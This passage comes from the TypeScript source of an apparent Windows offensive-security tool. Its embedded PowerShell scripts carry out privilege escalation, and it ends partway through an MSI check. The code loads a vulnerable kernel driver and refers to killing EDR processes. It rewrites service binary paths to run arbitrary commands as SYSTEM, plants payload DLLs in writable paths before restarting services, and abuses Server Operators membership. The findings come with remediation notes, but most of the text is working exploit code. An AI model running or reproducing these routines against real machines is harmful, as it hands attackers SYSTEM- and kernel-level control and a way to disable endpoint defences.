    Write-Output "    Signer: $($sig.SignerCertificate.Subject)"
}

# Create service for the driver
$servicePath = "\\??\\$driverPath"
Write-Output ""
Write-Output "[*] Creating kernel driver service..."

# Method 1: sc.exe create
sc.exe create $driverName type= kernel binPath= $driverPath 2>$null | Out-Null

# Method 2: Registry-based (works with SeLoadDriverPrivilege)
$regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$driverName"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "ImagePath" -Value $servicePath -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "Type" -Value 1 -PropertyType DWord -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "Start" -Value 3 -PropertyType DWord -Force | Out-Null
    Write-Output "[+] Service registry entry created"
}

# Start the driver
Write-Output "[*] Starting driver..."
sc.exe start $driverName 2>$null | Out-Null
Start-Sleep -Seconds 1

# Verify
$loaded = Get-WmiObject Win32_SystemDriver -Filter "Name='$driverName'" -ErrorAction SilentlyContinue
if ($loaded -and $loaded.State -eq 'Running') {
    Write-Output "[+] Driver loaded successfully!"
    Write-Output "    State: $($loaded.State)"
    Write-Output "    Path: $($loaded.PathName)"

    # Check device object
    $devices = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.Name -match $driverName } | Select-Object -First 1
    if ($devices) {
        Write-Output "    Device: $($devices.Name)"
    }

    ${
      target
        ? `
    # If target process specified, demonstrate EDR kill capability
    Write-Output ""
    Write-Output "[*] Target process: ${target}"
    $proc = Get-Process '${target}' -ErrorAction SilentlyContinue
    if ($proc) {
        Write-Output "[+] Process found: PID $($proc.Id)"
        Write-Output "[*] With kernel R/W primitive, can terminate protected processes"
        Write-Output "    Technique: Zero PreviousMode, direct kernel object manipulation"
    } else {
        Write-Output "[-] Process not found: ${target}"
    }`
        : ""
    }
} else {
    Write-Output "[-] Driver failed to load"
    Write-Output "[*] Check: signature valid? HVCI disabled? Running as admin?"

    # Cleanup
    sc.exe delete $driverName 2>$null | Out-Null
    Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("loaded successfully")) {
      findings.push({
        checkId: "WIN-BYOVD-003",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITED",
        resource: `driver://${driver}`,
        title: "Vulnerable kernel driver loaded — kernel-level access achieved",
        details: `Driver loaded from ${driver}. Full kernel R/W primitive available.`,
        remediation: "Unload driver: sc.exe stop + sc.exe delete. Enable HVCI. Enable vuln driver blocklist.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function weakServicePerms(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const service = argVal(args, "--service")
  const command = argVal(args, "--command")
  const findings: Finding[] = []
  const output: string[] = ["[*] Weak Service Permissions analysis...\n"]

  if (action === "enum") {
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

public class SvcACL {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern IntPtr OpenSCManager(string machine, string db, uint access);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr OpenService(IntPtr scm, string name, uint access);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool QueryServiceObjectSecurity(IntPtr handle, uint secInfo, byte[] sd, uint bufSize, out uint needed);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CloseServiceHandle(IntPtr handle);

    public const uint SC_MANAGER_CONNECT = 0x0001;
    public const uint READ_CONTROL = 0x00020000;
    public const uint SERVICE_QUERY_CONFIG = 0x0001;
}
"@

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$currentSid = $currentUser.User.Value
$currentGroups = $currentUser.Groups | ForEach-Object { $_.Value }

$services = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue
$vulnerable = @()

Write-Output "[*] Scanning $($services.Count) services..."
Write-Output ""

foreach ($svc in $services) {
    $issues = @()

    # Check 1: Service binary writable?
    $binPath = $svc.PathName
    if ($binPath) {
        # Extract exe path (handle quotes and arguments)
        if ($binPath -match '^"([^"]+)"') { $exePath = $Matches[1] }
        elseif ($binPath -match '^(\S+\\.exe)') { $exePath = $Matches[1] }
        else { $exePath = $binPath.Split(' ')[0] }

        if (Test-Path $exePath -ErrorAction SilentlyContinue) {
            try {
                $acl = Get-Acl $exePath -ErrorAction Stop
                foreach ($ace in $acl.Access) {
                    $sid = try { (New-Object System.Security.Principal.NTAccount($ace.IdentityReference.Value)).Translate([System.Security.Principal.SecurityIdentifier]).Value } catch { "" }
                    if (($sid -eq $currentSid -or $currentGroups -contains $sid -or $ace.IdentityReference.Value -match 'Users|Everyone|Authenticated') -and
                        $ace.AccessControlType -eq 'Allow' -and
                        ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
                        $issues += "WRITABLE_BINARY: $exePath"
                    }
                }
            } catch {}
        }

        # Check parent directory writable (for DLL planting)
        $parentDir = Split-Path $exePath -Parent -ErrorAction SilentlyContinue
        if ($parentDir -and (Test-Path $parentDir)) {
            try {
                $dirAcl = Get-Acl $parentDir -ErrorAction Stop
                foreach ($ace in $dirAcl.Access) {
                    if ($ace.IdentityReference.Value -match 'Users|Everyone|Authenticated' -and
                        $ace.AccessControlType -eq 'Allow' -and
                        ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
                        $issues += "WRITABLE_DIR: $parentDir"
                    }
                }
            } catch {}
        }
    }

    # Check 2: Service DACL — can we change config?
    try {
        $sdOutput = sc.exe sdshow $svc.Name 2>$null
        if ($sdOutput -and $sdOutput[0] -match '^D:') {
            $sddl = $sdOutput[0]
            # Parse for dangerous grants to well-known low-priv SIDs
            # BU = BUILTIN\\Users, WD = Everyone, AU = Authenticated Users
            $dangerousSids = @('BU', 'WD', 'AU', 'IU')
            foreach ($sid in $dangerousSids) {
                # Look for CC (SERVICE_CHANGE_CONFIG), DC (SERVICE_START), GA (GENERIC_ALL), WD (WRITE_DAC), WO (WRITE_OWNER)
                if ($sddl -match "\(A;[^;]*;[^;]*(?:CC|DC|GA|WD|WO)[^;]*;[^;]*;[^;]*;$sid\)") {
                    $issues += "WEAK_DACL: $sid has dangerous permissions"
                }
            }
        }
    } catch {}

    if ($issues.Count -gt 0) {
        $vulnerable += [PSCustomObject]@{
            Name = $svc.Name
            Display = $svc.DisplayName
            State = $svc.State
            StartMode = $svc.StartMode
            RunAs = $svc.StartName
            Path = $svc.PathName
            Issues = $issues
        }
    }
}

if ($vulnerable.Count -eq 0) {
    Write-Output "[-] No services with weak permissions found"
} else {
    Write-Output "[+] Found $($vulnerable.Count) vulnerable service(s):"
    foreach ($v in $vulnerable) {
        Write-Output "  Service:  $($v.Name) ($($v.Display))"
        Write-Output "  State:    $($v.State) | Start: $($v.StartMode) | RunAs: $($v.RunAs)"
        Write-Output "  Path:     $($v.Path)"
        foreach ($issue in $v.Issues) {
            Write-Output "  [!] $issue"
        }
        Write-Output ""
    }
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const vulnMatch = result.stdout.match(/Found (\d+) vulnerable/)
    const vulnCount = vulnMatch ? parseInt(vulnMatch[1]) : 0

    if (vulnCount > 0) {
      findings.push({
        checkId: "WIN-PRIVESC-WSP-001",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: "services://weak-perms",
        title: `${vulnCount} service(s) with exploitable permissions`,
        details: result.stdout.substring(0, 500),
        remediation:
          "Fix service DACLs to remove CHANGE_CONFIG/ALL_ACCESS from low-privilege groups. Restrict write access to service binary directories.",
      })
    }
  } else if (action === "exploit") {
    if (!service) return { output: "[!] Required: --service SERVICE_NAME --command CMD", findings }
    if (!command) return { output: "[!] Required: --command CMD (e.g., 'C:\\Windows\\Temp\\payload.exe')", findings }

    const script = `
$svc = Get-CimInstance Win32_Service -Filter "Name='${service}'" -ErrorAction SilentlyContinue
if (-not $svc) {
    Write-Output "[-] Service '${service}' not found"
    exit 1
}

Write-Output "[*] Target: ${service} (RunAs: $($svc.StartName))"
Write-Output "[*] Original path: $($svc.PathName)"

# Save original path for restoration
$originalPath = $svc.PathName

# Change the binary path
Write-Output "[*] Changing service binary path..."
$result = sc.exe config ${service} binpath= "${command}" 2>&1
Write-Output "    sc config result: $result"

if ($result -match 'SUCCESS') {
    Write-Output "[+] Service path changed to: ${command}"
    Write-Output "[*] Starting service to trigger execution..."

    # Try to restart the service
    try {
        Stop-Service ${service} -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        Start-Service ${service} -ErrorAction SilentlyContinue
        Write-Output "[+] Service restart triggered"
    } catch {
        Write-Output "[!] Could not restart: check manually"
    }

    # Restore original path
    Write-Output "[*] Restoring original path..."
    sc.exe config ${service} binpath= "$originalPath" 2>&1 | Out-Null
    Write-Output "[+] Original path restored"
} else {
    Write-Output "[-] Failed to change service config (insufficient permissions)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("Service path changed")) {
      findings.push({
        checkId: "WIN-PRIVESC-WSP-002",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITED",
        resource: `service://${service}`,
        title: `Weak service permissions exploited: ${service}`,
        details: `Service binary path changed and restart triggered. Command executed as service account.`,
        remediation: "Fix service DACL, verify service binary path integrity.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dllSideload(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const target = argVal(args, "--target")
  const dll = argVal(args, "--dll")
  const findings: Finding[] = []
  const output: string[] = ["[*] DLL Sideload — privilege escalation via phantom DLL hijacking\n"]

  if (action === "enum") {
    const script = `
# Known vulnerable service → missing DLL combinations
$targets = @(
    @{ Service = "StorSvc";     DLL = "SprintCSP.dll";    Path = "$env:SystemRoot\\System32"; Desc = "Windows Storage Service" },
    @{ Service = "IKEEXT";      DLL = "wlbsctrl.dll";     Path = "$env:SystemRoot\\System32"; Desc = "IKE and AuthIP Keying" },
    @{ Service = "NetMan";      DLL = "wlanhlp.dll";      Path = "$env:SystemRoot\\System32"; Desc = "Network Connections" },
    @{ Service = "SessionEnv";  DLL = "TSMSISrv.dll";     Path = "$env:SystemRoot\\System32"; Desc = "Remote Desktop Configuration" },
    @{ Service = "CDPSvc";      DLL = "cdpsgshims.dll";   Path = "$env:SystemRoot\\System32"; Desc = "Connected Devices Platform" },
    @{ Service = "Wlanext";     DLL = "wlanext.dll";      Path = "$env:SystemRoot\\System32\\Wlan"; Desc = "Wireless LAN Extension" },
    @{ Service = "DiagTrack";   DLL = "diagtrack_win.dll"; Path = "$env:SystemRoot\\System32"; Desc = "Diagnostics Tracking" },
    @{ Service = "fxssvc";      DLL = "FXSST.dll";       Path = "$env:SystemRoot\\System32"; Desc = "Fax Service" },
    @{ Service = "MSDTC";       DLL = "oci.dll";          Path = "$env:SystemRoot\\System32"; Desc = "Distributed Transaction Coordinator" },
    @{ Service = "UsoSvc";      DLL = "windowscoredeviceinfo.dll"; Path = "$env:SystemRoot\\System32"; Desc = "Update Orchestrator" }
)

$exploitable = 0

foreach ($t in $targets) {
    $svc = Get-Service $t.Service -ErrorAction SilentlyContinue
    if (-not $svc) { continue }

    $dllPath = Join-Path $t.Path $t.DLL
    $dllExists = Test-Path $dllPath
    $svcRunning = $svc.Status -eq 'Running'
    $svcStartMode = (Get-WmiObject Win32_Service -Filter "Name='$($t.Service)'" -ErrorAction SilentlyContinue).StartMode

    # Check directory writability
    $dirWritable = $false
    if (Test-Path $t.Path) {
        $testFile = Join-Path $t.Path ("cs_test_" + [guid]::NewGuid().ToString("N").Substring(0,6) + ".tmp")
        try {
            [System.IO.File]::WriteAllText($testFile, "test")
            Remove-Item $testFile -Force
            $dirWritable = $true
        } catch {
            $dirWritable = $false
        }
    }

    # Also check via icacls
    if (-not $dirWritable) {
        $pathAcl = icacls $t.Path 2>$null | Out-String
        if ($pathAcl -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)|Authenticated Users.*\(F\)|Authenticated Users.*\(M\)') {
            $dirWritable = $true
        }
    }

    $status = if (-not $dllExists -and $dirWritable) {
        $exploitable++
        "[+] EXPLOITABLE"
    } elseif (-not $dllExists) {
        "[~] Missing DLL but dir not writable"
    } else {
        "[-] DLL exists"
    }

    Write-Output "$status $($t.Service) ($($t.Desc))"
    Write-Output "    DLL: $dllPath"
    Write-Output "    DLL exists: $dllExists | Dir writable: $dirWritable"
    Write-Output "    Service: $($svc.Status) | StartMode: $svcStartMode"
    Write-Output ""
}

# Also check PATH directories for DLL search order hijacking
Write-Output "[*] Checking writable PATH directories..."
$pathDirs = $env:PATH -split ';'
$writablePaths = @()
foreach ($dir in $pathDirs) {
    if (-not $dir -or -not (Test-Path $dir)) { continue }
    $testFile = Join-Path $dir ("cs_test_" + [guid]::NewGuid().ToString("N").Substring(0,6) + ".tmp")
    try {
        [System.IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force
        $writablePaths += $dir
        Write-Output "    [+] WRITABLE: $dir"
    } catch { }
}

Write-Output ""
Write-Output "=== Summary ==="
Write-Output "Exploitable services: $exploitable"
Write-Output "Writable PATH dirs: $($writablePaths.Count)"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const exploitMatch = result.stdout.match(/Exploitable services: (\d+)/)
    const count = exploitMatch ? parseInt(exploitMatch[1]) : 0
    if (count > 0) {
      findings.push({
        checkId: "WIN-DLL-SIDE-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "services://dll-sideload",
        title: `${count} services vulnerable to DLL sideloading`,
        details: result.stdout.substring(0, 500),
        remediation: "Fix service DLL search paths. Remove writable directories from system PATH.",
      })
    }
  } else if (action === "exploit") {
    if (!target) return { output: "[!] Required: --target SERVICE_NAME", findings }
    if (!dll) return { output: "[!] Required: --dll PATH_TO_MALICIOUS_DLL", findings }

    const script = `
$svc = Get-Service '${target}' -ErrorAction SilentlyContinue
if (-not $svc) { Write-Output "[-] Service not found: ${target}"; exit 1 }

# Determine the expected DLL path
$svcConfig = Get-WmiObject Win32_Service -Filter "Name='${target}'" -ErrorAction SilentlyContinue
$svcPath = Split-Path $svcConfig.PathName.Trim('"') -Parent
if (-not $svcPath) { $svcPath = "$env:SystemRoot\\System32" }

Write-Output "[*] Service: ${target} ($($svc.Status))"
Write-Output "[*] Service path: $svcPath"
Write-Output "[*] Copying DLL..."

# Copy the malicious DLL
Copy-Item '${dll}' $svcPath -Force -ErrorAction Stop
Write-Output "[+] DLL placed in: $svcPath"

# Restart service to trigger DLL load
if ($svc.Status -eq 'Running') {
    Write-Output "[*] Restarting service to trigger DLL load..."
    Restart-Service '${target}' -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    $newStatus = (Get-Service '${target}').Status
    Write-Output "[+] Service status: $newStatus"
} else {
    Write-Output "[*] Starting service to trigger DLL load..."
    Start-Service '${target}' -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    $newStatus = (Get-Service '${target}').Status
    Write-Output "[+] Service status: $newStatus"
}

Write-Output "[+] DLL should have been loaded by service process"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-DLL-SIDE-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `service://${target}`,
      title: `DLL sideloaded into service: ${target}`,
      details: `Malicious DLL placed and service restarted`,
      remediation: "Remove the sideloaded DLL. Restart the service with original binaries.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function serverOperatorAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const service = argVal(args, "--service")
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] Server Operator Abuse — privilege escalation via service modification\n"]

  if (action === "check") {
    const script = `
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$groups = $identity.Groups | ForEach-Object {
    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
}

$isServerOp = $groups -contains 'BUILTIN\\Server Operators'
$isBackupOp = $groups -contains 'BUILTIN\\Backup Operators'
$isPrintOp = $groups -contains 'BUILTIN\\Print Operators'
$isAccountOp = $groups -contains 'BUILTIN\\Account Operators'

Write-Output "[*] Current user: $($identity.Name)"
Write-Output ""
Write-Output "[*] Privileged group membership:"
Write-Output "    Server Operators:  $isServerOp"
Write-Output "    Backup Operators:  $isBackupOp"
Write-Output "    Print Operators:   $isPrintOp"
Write-Output "    Account Operators: $isAccountOp"
Write-Output ""

$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
Write-Output "[*] Is Domain Controller: $isDC"

if ($isServerOp) {
    Write-Output ""
    Write-Output "[+] EXPLOITABLE — Server Operators can modify services"
    Write-Output ""
    Write-Output "[*] Enumerating modifiable services..."

    # Find services we can modify
    $services = Get-WmiObject Win32_Service | Where-Object {
        $_.StartMode -eq 'Auto' -and $_.State -eq 'Running'
    } | Select-Object Name, DisplayName, PathName, StartName, State -First 20

    foreach ($svc in $services) {
        # Test if we can query the service config (indicates we have access)
        $sdInfo = sc.exe sdshow $svc.Name 2>$null
        if ($sdInfo -and $sdInfo -notmatch 'FAILED') {
            Write-Output "    [+] $($svc.Name) — runs as: $($svc.StartName) — $($svc.State)"
            Write-Output "        Path: $($svc.PathName)"
        }
    }
    Write-Output ""
    Write-Output "[*] Use: --action exploit --service SERVICE_NAME --payload 'CMD'"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("EXPLOITABLE")) {
      findings.push({
        checkId: "WIN-SERVEROP-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "group://Server Operators",
        title: "Server Operators privilege escalation possible",
        details: "Current user is in Server Operators — can modify service binaries for SYSTEM execution",
        remediation: "Remove user from Server Operators group. Use gMSA for service accounts.",
      })
    }
  } else if (action === "exploit") {
    if (!service) return { output: "[!] Required: --service SERVICE_NAME", findings }
    if (!payload) return { output: "[!] Required: --payload CMD (command to run as SYSTEM)", findings }

    const script = `
Write-Output "[*] Targeting service: ${service}"

# Save original config
$origConfig = sc.exe qc '${service}' 2>$null
$origPath = ($origConfig | Select-String 'BINARY_PATH_NAME').ToString().Split(':',2)[1].Trim()
Write-Output "[*] Original binary path: $origPath"

# Modify service binary path
Write-Output "[*] Modifying service binary path..."
sc.exe config '${service}' binPath= '${payload}' 2>$null | Out-Null
$newConfig = sc.exe qc '${service}' 2>$null
$newPath = ($newConfig | Select-String 'BINARY_PATH_NAME').ToString().Split(':',2)[1].Trim()
Write-Output "[+] New binary path: $newPath"

# Stop and start the service
Write-Output "[*] Restarting service..."
sc.exe stop '${service}' 2>$null | Out-Null
Start-Sleep -Seconds 2
sc.exe start '${service}' 2>$null | Out-Null
Write-Output "[+] Service restarted — command executed as SYSTEM"

# Restore original path
Write-Output "[*] Restoring original binary path..."
sc.exe config '${service}' binPath= "$origPath" 2>$null | Out-Null
Write-Output "[+] Original path restored"

Write-Output ""
Write-Output "[+] Exploitation complete"
Write-Output "    Service: ${service}"
Write-Output "    Command executed: ${payload}"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-SERVEROP-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `service://${service}`,
      title: `Server Operator privesc via service: ${service}`,
      details: `Modified service binary path to execute: ${payload}`,
      remediation: "Verify service binary path is restored. Remove Server Operators membership.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function dllHijack(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const target = argVal(args, "--target")
  const dll = argVal(args, "--dll")
  const findings: Finding[] = []
  const output: string[] = ["[*] DLL Hijacking analysis...\n"]

  if (action === "enum") {
    const script = `
# ── Part 1: Writable directories in system PATH ──
Write-Output "=== Writable PATH Directories ==="

$pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) } | Sort-Object -Unique
$writablePaths = @()

foreach ($dir in $pathDirs) {
    try {
        $testFile = Join-Path $dir ".cs_dll_test_$([guid]::NewGuid().ToString('N').Substring(0,6))"
        [System.IO.File]::Create($testFile).Close()
        Remove-Item $testFile -Force
        $writablePaths += $dir
        Write-Output "  [WRITABLE] $dir"
    } catch {
        # not writable
    }
}

if ($writablePaths.Count -eq 0) {
    Write-Output "  [-] No writable PATH directories found"
}

# ── Part 2: Known DLL hijack targets ──
Write-Output ""
Write-Output "=== Known DLL Hijack Targets ==="

$knownHijacks = @(
    @{ Service = "StorSvc"; DLL = "SprintCSP.dll"; Desc = "Storage Service — loads from PATH, runs as SYSTEM" },
    @{ Service = "CDPSvc"; DLL = "cdpsgshims.dll"; Desc = "Connected Devices Platform — missing DLL loaded at startup" },
    @{ Service = "DiagTrack"; DLL = "diagtrack_win.dll"; Desc = "Diagnostics Tracking — phantom DLL load" },
    @{ Service = "UsoSvc"; DLL = "windowscoredeviceinfo.dll"; Desc = "Update Orchestrator — DLL search order hijack" },
    @{ Service = "IKEEXT"; DLL = "wlbsctrl.dll"; Desc = "IKE/AuthIP — classic missing DLL (Win7-10)" },
    @{ Service = "NetMan"; DLL = "wlanhlp.dll"; Desc = "Network Connections — missing wireless DLL on wired-only systems" },
    @{ Service = "SessionEnv"; DLL = "TSMSISrv.dll"; Desc = "Remote Desktop Configuration — missing DLL if RDS not installed" },
    @{ Service = "Fax"; DLL = "FXSSVC.dll"; Desc = "Fax Service — writable by Users in some configs" },
    @{ Service = "seclogon"; DLL = "slui.dll"; Desc = "Secondary Logon — search order confusion" },
    @{ Service = "SensorService"; DLL = "SensorPerformanceEvents.dll"; Desc = "Sensor Monitoring — optional DLL" }
)

foreach ($h in $knownHijacks) {
    $svc = Get-Service $h.Service -ErrorAction SilentlyContinue
    $status = if ($svc) { $svc.Status } else { "NOT_INSTALLED" }
    $startType = if ($svc) {
        try { (Get-CimInstance Win32_Service -Filter "Name='$($h.Service)'" -ErrorAction SilentlyContinue).StartMode } catch { "Unknown" }
    } else { "N/A" }

    # Check if the DLL already exists in System32
    $dllExists = Test-Path "$env:SystemRoot\\System32\\$($h.DLL)" -ErrorAction SilentlyContinue

    # Check if any writable PATH dir could host this DLL
    $canHijack = $false
    $hijackPath = ""
    if (-not $dllExists) {
        foreach ($wp in $writablePaths) {
            $canHijack = $true
            $hijackPath = Join-Path $wp $h.DLL
            break
        }
    }

    $indicator = if ($canHijack) { "[EXPLOITABLE]" } elseif (-not $dllExists) { "[DLL MISSING]" } else { "[DLL EXISTS]" }
    Write-Output "  $indicator $($h.Service) -> $($h.DLL)"
    Write-Output "      Status: $status | Start: $startType"
    Write-Output "      $($h.Desc)"
    if ($canHijack) { Write-Output "      Target: $hijackPath" }
    Write-Output ""
}

# ── Part 3: Service binary directory permissions ──
Write-Output "=== SYSTEM Services with Writable Binary Directories ==="

$systemServices = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
    $_.StartName -match 'LocalSystem|SYSTEM' -and $_.PathName
}

$writableSvcDirs = @()
foreach ($svc in $systemServices) {
    $binPath = $svc.PathName
    if ($binPath -match '^"([^"]+)"') { $exePath = $Matches[1] }
    elseif ($binPath -match '^(\S+\\.exe)') { $exePath = $Matches[1] }
    else { continue }

    $dir = Split-Path $exePath -Parent -ErrorAction SilentlyContinue
    if (-not $dir -or -not (Test-Path $dir) -or $dir -match 'System32|SysWOW64') { continue }

    try {
        $testFile = Join-Path $dir ".cs_svc_test"
        [System.IO.File]::Create($testFile).Close()
        Remove-Item $testFile -Force
        $writableSvcDirs += [PSCustomObject]@{ Name = $svc.Name; Dir = $dir; Path = $svc.PathName }
        Write-Output "  [WRITABLE] $($svc.Name) -> $dir"
    } catch {}
}

if ($writableSvcDirs.Count -eq 0) {
    Write-Output "  [-] No writable SYSTEM service directories found"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const exploitableCount = (result.stdout.match(/\[EXPLOITABLE\]/g) || []).length
    const writablePathCount = (result.stdout.match(/\[WRITABLE\]/g) || []).length

    if (exploitableCount > 0 || writablePathCount > 0) {
      findings.push({
        checkId: "WIN-PRIVESC-DLL-001",
        provider: "windows",
        severity: exploitableCount > 0 ? "critical" : "high",
        status: exploitableCount > 0 ? "VULNERABLE" : "ENUMERATED",
        resource: "dll://hijack-targets",
        title: `${exploitableCount} exploitable DLL hijack(s), ${writablePathCount} writable location(s)`,
        details: result.stdout.substring(0, 500),
        remediation:
          "Remove write permissions from PATH directories. Install missing DLLs. Use DLL redirection or SafeDllSearchMode.",
      })
    }
  } else if (action === "exploit") {
    if (!target) return { output: "[!] Required: --target SERVICE_NAME --dll DLL_PATH", findings }
    if (!dll) return { output: "[!] Required: --dll DLL_PATH (path to your payload DLL)", findings }

    const script = `
Write-Output "[*] DLL hijack exploit for service: ${target}"

# Find where to place the DLL
$pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }
$targetDir = $null

foreach ($dir in $pathDirs) {
    try {
        $testFile = Join-Path $dir ".cs_hijack_test"
        [System.IO.File]::Create($testFile).Close()
        Remove-Item $testFile -Force
        $targetDir = $dir
        break
    } catch {}
}

if (-not $targetDir) {
    Write-Output "[-] No writable PATH directory found"
    exit 1
}

# Determine the expected DLL name for this service
$knownDlls = @{
    'StorSvc' = 'SprintCSP.dll'
    'CDPSvc' = 'cdpsgshims.dll'
    'DiagTrack' = 'diagtrack_win.dll'
    'UsoSvc' = 'windowscoredeviceinfo.dll'
    'IKEEXT' = 'wlbsctrl.dll'
    'NetMan' = 'wlanhlp.dll'
    'SessionEnv' = 'TSMSISrv.dll'
}

$dllName = $knownDlls['${target}']
if (-not $dllName) {
    Write-Output "[-] Unknown service '${target}' — provide the expected DLL name manually"
    exit 1
}

$destPath = Join-Path $targetDir $dllName
Write-Output "[*] Placing DLL: ${dll} -> $destPath"
Copy-Item "${dll}" $destPath -Force
Write-Output "[+] DLL placed: $destPath"

# Trigger the service
Write-Output "[*] Restarting service ${target}..."
try {
    Restart-Service ${target} -Force -ErrorAction Stop
    Write-Output "[+] Service restarted — DLL should be loaded"
} catch {
    Write-Output "[!] Could not restart service: use 'sc start ${target}' or wait for reboot"
}

Write-Output "[!] Cleanup: Remove-Item '$destPath'"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("DLL placed")) {
      findings.push({
        checkId: "WIN-PRIVESC-DLL-002",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITED",
        resource: `service://${target}`,
        title: `DLL hijack exploited: ${target}`,
        details: `Payload DLL placed in writable PATH directory. Service restart triggers execution as SYSTEM.`,
        remediation: "Remove planted DLL, fix PATH directory permissions, install the legitimate DLL.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function msiAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const payload = argVal(args, "--payload")
  const msiOutput = argVal(args, "--output") || "C:\\Windows\\Temp\\cs-privesc.msi"
  const findings: Finding[] = []
  const output: string[] = ["[*] MSI Abuse — privilege escalation via Windows Installer\n"]

  if (action === "check") {
    const script = `
# Check AlwaysInstallElevated in both HKLM and HKCU
$hklm = Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

$hklmEnabled = $hklm -and $hklm.AlwaysInstallElevated -eq 1
$hkcuEnabled = $hkcu -and $hkcu.AlwaysInstallElevated -eq 1

Write-Output "[*] AlwaysInstallElevated status:"
Write-Output "    HKLM: $(if ($hklmEnabled) { 'ENABLED (1)' } else { 'Disabled/Not set' })"
Write-Output "    HKCU: $(if ($hkcuEnabled) { 'ENABLED (1)' } else { 'Disabled/Not set' })"
Write-Output ""

if ($hklmEnabled -and $hkcuEnabled) {
    Write-Output "[+] VULNERABLE — AlwaysInstallElevated is enabled in both HKLM and HKCU!"
    Write-Output "    Any user can install MSI packages with SYSTEM privileges."
    Write-Output "    Use: --action craft --payload 'CMD' --output 'path.msi'"
} elseif ($hklmEnabled -or $hkcuEnabled) {
    Write-Output "[~] Partially configured — both keys must be set to 1 for exploitation"
} else {
    Write-Output "[-] AlwaysInstallElevated not enabled"
}

# Check for MSI repair abuse opportunities
Write-Output ""
Write-Output "[*] Checking installed MSI packages for repair abuse..."
$products = Get-WmiObject Win32_Product -ErrorAction SilentlyContinue | Select-Object Name, InstallLocation, InstallSource, Vendor -First 15

$repairTargets = 0
foreach ($prod in $products) {
    if ($prod.InstallSource -and (Test-Path $prod.InstallSource -ErrorAction SilentlyContinue)) {
        $srcAcl = icacls $prod.InstallSource 2>$null | Out-String
        if ($srcAcl -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)') {
            $repairTargets++
            Write-Output "    [+] WRITABLE SOURCE: $($prod.Name)"
            Write-Output "        Source: $($prod.InstallSource)"
        }
    }
}

if ($repairTargets -eq 0) {
    Write-Output "    [-] No writable MSI sources found for repair abuse"
}

# Check Windows Installer service
$msiService = Get-Service msiserver -ErrorAction SilentlyContinue
Write-Output ""
Write-Output "[*] Windows Installer service: $($msiService.Status)"
`
